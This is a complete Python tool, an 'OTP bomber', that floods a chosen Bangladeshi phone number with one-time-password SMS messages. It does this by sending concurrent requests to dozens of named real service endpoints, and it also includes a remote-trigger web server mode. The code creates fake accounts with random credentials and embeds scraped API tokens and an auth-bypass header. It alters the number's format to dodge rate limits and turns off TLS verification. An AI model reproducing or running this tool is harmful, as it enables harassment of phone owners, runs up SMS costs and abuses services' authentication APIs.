#!/usr/bin/env python3
"""OTP Bomb Runner V2 - Async (aiohttp, ~500 concurrent, ~1-2s/round)
Usage: python runner_async.py 017XXXXXXXX 5
   or: python runner_async.py --server [--port 8080]
"""

import sys
import os
import json
import random
import hashlib
import time
import ssl
import string
from urllib.parse import parse_qs, urlparse, quote as urlquote

import asyncio
from aiohttp import web, ClientSession, TCPConnector, ClientTimeout
import orjson

UA = ("Mozilla/5.0 (Linux; Android 11; Infinix X665B Build/RP1A.200720.011; wv) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/150.0.7871.124 Mobile Safari/537.36")

FN = ['Rahim','Karim','Sajid','Tanvir','Fahim','Arif','Mehedi','Rakib','Nayem','Jubayer','Sakib','Tamim','Rafi','Sohel','Imran']
LN = ['Hasan','Ahmed','Islam','Rahman','Hossain','Alam','Uddin','Khan','Mia','Sarkar','Chowdhury','Ali','Sikder','Das','Roy']
EC = 'abcdefghijklmnopqrstuvwxyz0123456789'
PC = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$%'
DM = ['gmail.com','yahoo.com','outlook.com','hotmail.com']

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

CONNECTOR = TCPConnector(
    limit=500,
    limit_per_host=50,
    ttl_dns_cache=300,
    enable_cleanup_closed=True,
    ssl=CTX
)
TIMEOUT = ClientTimeout(total=8, connect=3, sock_read=5)

BUGGY_APIS = {
    'aarong', 'bdjob', 'bengalmeat', 'chaldal', 'chorcha', 'esquire',
    'ghorerbazar', 'kabbik', 'kireibd', 'osudpotro', 'pbazaar',
    'propertywala', 'quizgiri', 'trucklagbe', 'unimart'
}

APIS = [
    'binge', 'admissiontaker', 'medico', 'chardike', 'apex4u', 'ghoori',
    'mygp', 'shikho', 'redx', 'fteducation', 'banglalink', 'robi',
    'bohubrihi', 'sheba', 'trucklagbe', 'osudpotro', 'banglamed',
    'khaasfood', 'cookups', 'arogga', 'chaldal', 'shohoz', 'bengalmeat',
    'unimart', 'cholpori', 'deeptoplay', 'paperfly', 'aarong', 'esquire',
    'htmind', 'kireibd', 'kabbik', 'cinespot', 'edutubebd', 'propertywala',
    'bengalmeat_otp', 'perfumeshop', 'bookhouse'
]

MAX_WORKERS = 500


def rn():
    return random.choice(FN), random.choice(LN)


def re():
    return f"{''.join(random.choice(EC) for _ in range(random.randint(6, 10)))}@{random.choice(DM)}"


def rp():
    return ''.join(random.choice(PC) for _ in range(random.randint(8, 12)))


def generate_variant(raw_phone, gen_index):
    clean = raw_phone.strip().removeprefix('+880').lstrip('+').replace('-', '').replace(' ', '')
    n = len(clean)
    if gen_index < n + 1:
        if gen_index == 0:
            return '+' + clean
        return clean[:gen_index] + '+' + clean[gen_index:]
    else:
        d = gen_index - (n + 1)
        if d >= n + 1:
            d = d % (n + 1)
        if d == 0:
            return '-' + clean
        return clean[:d] + '-' + clean[d:]


def fmt_phone(raw):
    raw = raw.strip()
    if raw.startswith('+880'):
        p8 = raw[1:]
        pr = '0' + raw[4:]
    elif raw.startswith('0'):
        p8 = '880' + raw[1:]
        pr = raw
    elif raw.startswith('880'):
        p8 = raw
        pr = '0' + raw[3:]
    else:
        p8 = '880' + raw
        pr = raw if raw.startswith('0') else '0' + raw
    return {'raw': pr, 'p880': p8, 'plus': '+' + p8, 'dash': '+88-' + pr}


async def preflight(session, url, extra_hdrs=None):
    h = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml'}
    if extra_hdrs:
        h.update(extra_hdrs)
    try:
        async with session.get(url, headers=h, timeout=TIMEOUT) as resp:
            return await resp.text()
    except Exception:
        return ''


async def build_request(session, api, phone, variant=None):
    fN, lN = rn()
    fun = f"{fN} {lN}"
    em = re()
    pw = rp()

    if api in BUGGY_APIS and variant:
        vp = variant
    else:
        vp = phone

    pr = vp['raw']
    p8 = vp['p880']
    pp = vp['plus']
    pd = vp['dash']

    url = ''
    body = None
    method = 'POST'
    h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': UA}

    try:
        if api == 'binge':
            url = 'https://api.binge.buzz/api/v4/auth/otp/send'
            body = orjson.dumps({"phone": pp})
            h['Origin'] = 'https://binge.buzz'
        elif api == 'admissiontaker':
            url = 'https://www.admissiontaker.site/api/send-reg-otp'
            body = orjson.dumps({"phone_number": pr})
        elif api == 'medico':
            url = 'https://api.v2.medico.bio/patient/passwordless-login'
            body = orjson.dumps({"phoneNumber": pr, "deviceId": pr, "channel": "web", "userType": "patient", "type": "newUser", "otpLength": 6})
        elif api == 'chardike':
            url = 'https://api.chardike.com/api/3f8d1e74-9a5c-4f2d-a7b1-6c8e2d91f4ab/'
            body = orjson.dumps({"phone": pr, "otp_type": "login", "from_request": "web"})
        elif api == 'apex4u':
            url = 'https://api.apex4u.com/api/auth/login'
            body = orjson.dumps({"phoneNumber": pr})
        elif api == 'ghoori':
            url = 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn'
            body = orjson.dumps({"mobile_no": pr})
            h['Origin'] = 'https://ghoorilearning.com'
            h['Referer'] = 'https://ghoorilearning.com/'
            h['sec-ch-ua'] = '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"'
            h['sec-ch-ua-mobile'] = '?1'
        elif api == 'mygp':
            url = 'https://weblogin.grameenphone.com/backend/api/v1/otp'
            body = orjson.dumps({"msisdn": pr})
        elif api == 'shikho':
            url = 'https://api.shikho.com/auth/v2/send/sms'
            body = orjson.dumps({"phone": p8, "type": "student", "auth_type": "signup", "vendor": "shikho"})
        elif api == 'redx':
            url = 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp'
            body = orjson.dumps({"phoneNumber": pr})
        elif api == 'fteducation':
            await preflight(session, 'https://webapp.ft.education/auth/registration')
            url = 'https://webapp.ft.education/auth/registration'
            body = orjson.dumps({"name": fN, "mobile": p8, "fb_id": ""})
            h.update({'X-Requested-With': 'XMLHttpRequest', 'X-Inertia': 'true',
                      'X-Inertia-Version': '93ac2f75562c111176bdccff246ce6e7',
                      'Origin': 'https://webapp.ft.education'})
        elif api == 'banglalink':
            try:
                async with session.get('https://web-api.banglalink.net/api/v1/get-secret',
                                       headers={'User-Agent': UA, 'Origin': 'https://www.banglalink.net', 'Accept': 'application/json'},
                                       timeout=TIMEOUT) as sr:
                    tk = (await sr.json()).get('data', {}).get('secret', '')
            except Exception:
                tk = ''
            url = 'https://web-api.banglalink.net/api/v1/user/otp-login/request'
            body = orjson.dumps({"msisdn": pr, "secret": tk})
            h['client-security-token'] = tk
            h['Origin'] = 'https://www.banglalink.net'
        elif api == 'robi':
            url = 'https://www.robi.com.bd/en/auth/login:01882873117:01788874786'
            body = orjson.dumps([{"msisdn": pr}])
            h = {'Content-Type': 'text/plain;charset=UTF-8', 'Accept': 'text/x-component',
                 'User-Agent': UA, 'Origin': 'https://www.bliali.com.bd',
                 'next-action': '7f085f18ad8ebc8d49e2e00713b7e5568e836b5483'}
        elif api == 'bohubrihi':
            url = 'https://bb-api.bohubrihi.com/public/activity/otp'
            body = orjson.dumps({"phone": pr, "intent": "login"})
        elif api == 'sheba':
            url = 'https://accountkit.sheba.xyz/api/shoot-otp'
            body = orjson.dumps({"mobile": pp, "app_id": "8329815A6D1AE6DD",
                                 "api_token": "d1op1o9xvVPShfr2k3JNzUt4RamE84vOrYgX89bCPFKhpWuzitVVadas4uMpgM"})
        elif api == 'trucklagbe':
            url = 'https://tethys.trucklagbe.com/tl_gateway/tl_login/131/loginWithPhoneNo'
            body = orjson.dumps({"userType": "shipper", "phoneNo": pr})
            h['X-Bypass-Auth-Key'] = 'b6253a42-50be-444a-8017-cd1319f4e79b-b280108f-3bdc-4ea7-964e-07e78cb5c90'
            h['deviceId'] = '103.66.1684.2011784186323086'
            h['source'] = 'website'
        elif api == 'osudpotro':
            url = 'https://api.osudpotro.com/api/v1/users/send_otp'
            body = orjson.dumps({"mobile": pd, "deviceToken": "web", "language": "en", "os": "web"})
        elif api == 'banglamed':
            await preflight(session, 'https://banglamed.net/preview/home-vue/login')
            url = 'https://banglamed.net/preview/home-vue/auth/send-otp'
            body = orjson.dumps({"phone_number": pr, "mode": "register", "redirect_url": ""})
            h['X-Requested-With'] = 'XMLHttpRequest'
            h['Origin'] = 'https://banglamed.net'
        elif api == 'khaasfood':
            url = f'https://api.khaasfood.com/api/app/one-time-passwords/token?username={pr}'
            body = None
            method = 'GET'
            h = {'User-Agent': UA, 'Accept': 'application/json', 'x-requested-with': 'com.khaasfood'}
        elif api == 'cookups':
            try:
                await session.post('https://api.cookups.app/api/v1/subject/Session/actMaybeConstruct/n44gxxD91U7Y4C216iFzFg',
                                   json={"Action": ["UpdateClientPlatform", "Web"],
                                         "Constructor": ["NewFromId", ["SessionId", "c7208e9f-fd10-4ed5-98e0-2db5ea217316"]]},
                                   headers={'Content-Type': 'application/json', 'User-Agent': UA},
                                   timeout=TIMEOUT)
            except Exception:
                pass
            url = 'https://api.cookups.app/api/v1/subject/Session/actMaybeConstruct/n54gxxD91U6Y4C216iFzFg'
            body = orjson.dumps({"Action": ["GenerateOtp", {"Value_": ["BdMobileNumber", pp]}],
                                 "Constructor": ["NewFromId", {"SessionId": "c7208e9f-fd10-4ed5-98b-2db5ea217316"}]})
            h['Origin'] = 'https://cookups.app'
        elif api == 'arogga':
            url = 'https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=149.0.7827.160&os=Android&osv=11'
            body = f"mobile={pr}&fcmToken=&referral="
            h = {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Accept': '*/*',
                 'User-Agent': UA, 'Origin': 'https://www.arogga.com'}
        elif api == 'chaldal':
            url = f"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey=ae1b1e1d&phoneNumber={urlquote(pp)}&retryAttempt=0"
            body = '{}'
            h['x-egg-clientapp'] = 'Omelette'
            h['x-egg-platform'] = 'Browser'
            h['x-egg-storeid'] = '1'
        elif api == 'shohoz':
            url = 'https://sso-live.shohoz.com/v1.0/web/auth/sign-up/request'
            body = orjson.dumps({"first_name": fN, "last_name": lN, "mobile_number": pr, "email": "", "gender": 1, "recaptcha": ""})
            h['X-Requested-With'] = 'XMLHttpRequest'
        elif api == 'bengalmeat':
            url = 'https://api.bengalmeat.com/auth/otp-login'
            body = orjson.dumps({"phone": pr})
        elif api == 'unimart':
            dob = f"{random.randint(1,28):02d}-{random.randint(1,12):02d}-{random.randint(1995,2003)}"
            url = 'https://myadmin.unimart.online/api/v1/auth/sign-up'
            body = orjson.dumps({"phone": pp, "dob": dob, "gender": "Male", "email": em, "password": pw, "name": fN})
            h = {'Content-Type': 'application/json; charset=UTF-8', 'Accept': '*/*',
                 'User-Agent': UA, 'authorization': 'null', 'store-id': '1',
                 'x-localization': 'en', 'zone-id': '[1]', 'module-id': '1', 'area-id': '1'}
        elif api == 'cholpori':
            url = 'https://www.cholpori.com/api/Auth/Register'
            body = orjson.dumps({"firstName": fN, "lastName": lN, "phoneNumber": pr, "role": "12"})
        elif api == 'deeptoplay':
            url = 'https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en'
            body = orjson.dumps({"number": pp})
            h['Authorization'] = ''
        elif api == 'paperfly':
            url = 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php'
            body = orjson.dumps({"full_name": fun, "company_name": f"{fN} Corp", "email_address": em, "phone_number": pr})
            h['device_identifier'] = 'undefined'
            h['device_name'] = 'undefined'
        elif api == 'aarong':
            try:
                async with session.get('https://www.aarong.com/api/auth/generate-token-web',
                                       headers={'User-Agent': UA, 'Accept': '*/*', 'Referer': 'https://www.aarong.com/bgd/customer/account/create'},
                                       timeout=TIMEOUT) as tr:
                    at = (await tr.json()).get('token', '')
            except Exception:
                at = ''
            dob = f"{random.randint(1,28):02d}-{random.randint(1,12):02d}-{random.randint(1995,2005)}"
            url = 'https://mcprod.aarong.com/graphql'
            body = orjson.dumps({
                "query": 'mutation createCustomerV2($firstname:String!,$lastname:String!,$mobile_number:String!,$email:String!,$dob:String!,$gender:Int!,$password:String!,$registered_from:String!){createCustomerV2(input:{firstname:$firstname,lastname:$lastname,mobile_number:$mobile_number,email:$email,dob:$dob,gender:$gender,password:$password,registered_from:$registered_from}){customer{firstname,lastname,email,mobile_number}}}',
                "variables": {"firstname": fN, "lastname": lN, "mobile_number": pr, "email": em, "dob": dob, "gender": "1", "password": pw, "registered_from": "Web"}
            })
            h = {'Content-Type': 'application/json', 'Accept': '*/*', 'User-Agent': UA,
                 'store': 'default', 'token': at, 'Origin': 'https://www.aarong.com'}
        elif api == 'esquire':
            url = 'https://api.ecommerce.esquireelectronicsltd.com/api/otp/generate-otp'
            body = orjson.dumps({"phoneNo": pr})
        elif api == 'htmind':
            url = 'https://api-manager.htmind.lol/v1/auth/web/send-otp'
            body = orjson.dumps({"phone": pr})
            h['Origin'] = 'https://www.hellotask.app'
        elif api == 'kireibd':
            await preflight(session, 'https://kireibd.com/login')
            url = 'https://frontendapi.kireibd.com/api/v2/send-login-otp'
            body = orjson.dumps({"email": pr})
            h['X-Requested-With'] = 'XMLHttpRequest'
        elif api == 'kabbik':
            ct = round(time.time() * 1000)
            url = 'https://api.kabbik.com/v1/auth/otpnew2'
            body = orjson.dumps({"msisdn": p8, "currentTimeLong": ct, "passKey": "gHxUjmKFwWPNHTGD"})
            h['authorization'] = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMjgyMCIsInJvbGUiOjEsImlhdCI6MTY2NTc0NjIyNX0.dSY47sipaGTI_OtsysFWw_kaKZKWHWRtp4vklstVgVc'
        elif api == 'cinespot':
            await preflight(session, 'https://cinespot.mobi/otp/sent')
            url = 'https://cinespot.mobi/otp/sent'
            body = f"_ten=x&mobile_number={pr}"
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA,
                 'Origin': 'https://cinespot.mobi', 'Referer': 'https://cinespot.mobi/sent'}
        elif api == 'edutubebd':
            await preflight(session, f'https://accounts.edutubebd.com/register/otp?phone={pr}&token=x',
                            {'X-Requested-With': 'XMLHttpRequest', 'X-Inertia': 'true',
                             'X-Inertia-Version': 'dc64b7f6cd379f407dccfbdc5434ffb0'})
            url = 'https://accounts.edutubebd.com/register/verify-phone'
            body = orjson.dumps({"phone": pr, "token": "placeholder_secret"})
            h.update({'X-Requested-With': 'XMLHttpRequest', 'X-Inertia': 'true',
                      'X-Inertia-Version': 'dc64b7f6cd379f407dccfbdc5434ffb0',
                      'Origin': 'https://accounts.edutubebd.com'})
        elif api == 'propertywala':
            url = 'https://propertywala.com/Handlers/AjaxHandler.ashx'
            body = urlencode({'task': 'authenticate', 'action': 'check', 'email': em,
                              'mobile': pr, 'mobileCode': '880', 'password': '', 'name': ''})
            h = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*',
                 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://propertywala.com',
                 'Cookie': 'locationId=20'}
            method = 'POST'
        elif api == 'bengalmeat_otp':
            url = 'https://api.bengalmeat.com/auth/otp-login'
            body = orjson.dumps({"phone": pr})
        elif api == 'perfumeshop':
            await preflight(session, 'https://perfumeshop.com.bd/')
            url = 'https://perfumeshop.com.bd/wp-admin/admin-ajax.php'
            body = urlencode({'action': 'psb_send_otp', 'phone': pr, 'nonce': '8065885c28'})
            h = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*',
                 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest',
                 'Origin': 'https://perfumeshop.com.bd', 'Referer': 'https://perfumeshop.com.bd/my-account/'}
            method = 'POST'
        elif api == 'bookhouse':
            await preflight(session, 'https://bookhouse.com.bd/register')
            url = 'https://bookhouse.com.bd/register'
            body = urlencode({'_token': 'x', 'name': fN, 'email': em, 'mobile_no': pr,
                              'password': pw, 'password_confirmation': pw, 'referral_code': ''})
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA,
                 'Origin': 'https://bookhouse.com.bd', 'Referer': 'https://bookhouse.com.bd/register'}
            method = 'POST'
        else:
            return None

        return {'method': method, 'url': url, 'headers': h, 'body': body}
    except Exception as e:
        return {'error': str(e)}


async def call_api(session, api, phone, variant=None):
    req = await build_request(session, api, phone, variant)
    if not req or 'error' in req:
        return {'api': api, 'status': 0, 'error': req.get('error', 'build_failed') if req else 'no_request'}

    method = req['method']
    url = req['url']
    headers = req['headers']
    body = req['body']

    try:
        if method == 'GET':
            async with session.get(url, headers=headers, timeout=TIMEOUT) as resp:
                await resp.read()
                return {'api': api, 'status': resp.status}
        else:
            if body is None:
                data = None
            elif isinstance(body, bytes):
                data = body
            elif isinstance(body, str):
                data = body.encode()
            else:
                data = orjson.dumps(body)
            async with session.request(method, url, headers=headers, data=data, timeout=TIMEOUT) as resp:
                await resp.read()
                return {'api': api, 'status': resp.status}
    except asyncio.TimeoutError:
        return {'api': api, 'status': 0, 'error': 'timeout'}
    except Exception as e:
        return {'api': api, 'status': 0, 'error': str(e)}


async def fire_round(phone, variant=None):
    async with ClientSession(connector=CONNECTOR, timeout=TIMEOUT, json_serialize=orjson.dumps) as session:
        tasks = [call_api(session, api, phone, variant) for api in APIS]
        return await asyncio.gather(*tasks)


async def run(phone, rounds):
    all_results = []
    total = len(APIS) * rounds
    ok_count = 0
    start = time.time()

    for r in range(rounds):
        variant = None
        if r < 20:
            variant = {}
            for v_idx in range(2 * (len(phone) + 1)):
                vp = fmt_phone(generate_variant(phone, v_idx))
                variant[v_idx] = vp

        results = await fire_round(phone, variant)
        for res in results:
            if res.get('status', 0) == 200:
                ok_count += 1
        all_results.extend(results)

    total_time = int((time.time() - start) * 1000)
    return {
        'status': 'completed',
        'phone': phone,
        'rounds': rounds,
        'total_apis': len(APIS),
        'total_hits': total,
        'success': ok_count,
        'failed': total - ok_count,
        'total_time_ms': total_time,
        'results': all_results
    }


async def handle_request(request):
    SECRET = os.environ.get('API_SECRET', 'SuSHiLx2024SMS')
    q = request.query
    phone = q.get('phone', '')
    rounds = min(max(int(q.get('rounds', '1')), 1), 50)
    key = q.get('key', '')

    if key != SECRET:
        return web.Response(text='Forbidden', status=403)

    if not phone or len(phone) < 11:
        return web.Response(text='Invalid phone. Use: /?phone=017XXXXXXXX&rounds=5&key=SECRET', status=400)

    asyncio.create_task(run(phone, rounds))
    return web.json_response({
        'status': 'started',
        'phone': phone,
        'rounds': rounds,
        'total_apis': len(APIS),
        'total_hits': len(APIS) * rounds,
        'msg': f'Robot started! {len(APIS) * rounds} SMS pathano hocche.'
    })


async def start_server(port=8080):
    app = web.Application()
    app.router.add_get('/', handle_request)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"""
OTP BOMB RUNNER ASYNC (aiohttp)
================================
Server: http://0.0.0.0:{port}
Usage:  http://YOUR_IP:{port}/?phone=017XXXX&rounds=5
APIs:   {len(APIS)} total
Workers: {MAX_WORKERS} concurrent
Buggy APIs (variant): {len(BUGGY_APIS)}
""")
    try:
        while True:
            await asyncio.sleep(3600)
    except KeyboardInterrupt:
        print("\nServer stopped.")
    finally:
        await runner.cleanup()


if __name__ == '__main__':
    if '--server' in sys.argv or '-s' in sys.argv:
        p = int(os.environ.get('PORT', 8080))
        for i, a in enumerate(sys.argv):
            if a == '--port' and i + 1 < len(sys.argv):
                p = int(sys.argv[i + 1])
        asyncio.run(start_server(p))
    elif len(sys.argv) >= 2 and any(c.isdigit() for c in sys.argv[1]):
        phone = sys.argv[1]
        rounds = int(sys.argv[2]) if len(sys.argv) >= 3 else 1
        print(f"Fire: {phone} x {rounds} rounds ({len(APIS) * rounds} hits)")
        result = asyncio.run(run(phone, rounds))
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        print("""
Usage:
  python runner_async.py 017XXXXXXXX 5
  python runner_async.py --server
  python runner_async.py --server --port 3000
""")